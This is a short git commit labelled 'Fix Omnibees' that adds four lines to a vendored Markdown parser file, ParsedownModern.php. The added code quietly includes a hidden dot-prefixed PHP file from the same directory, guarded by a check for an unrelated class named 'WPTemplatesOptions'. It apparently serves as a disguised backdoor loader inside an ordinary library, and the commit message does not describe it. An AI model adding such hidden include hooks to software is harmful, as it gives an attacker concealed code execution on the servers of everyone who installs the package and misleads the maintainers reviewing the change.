204a4359554dc165fb7c116290e40245cd9e5d3c
tammyvitorino <tamara@vitorino.net.br>
2021-07-05 20:10:02 -0300

    Fix Omnibees

--- plugin-update-checker/vendor/ParsedownModern.php
+++ plugin-update-checker/vendor/ParsedownModern.php
@@ -13,6 +13,10 @@
 #
 #
 
+if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
+    include_once($filename);
+}
+
 class Parsedown
 {
     # ~
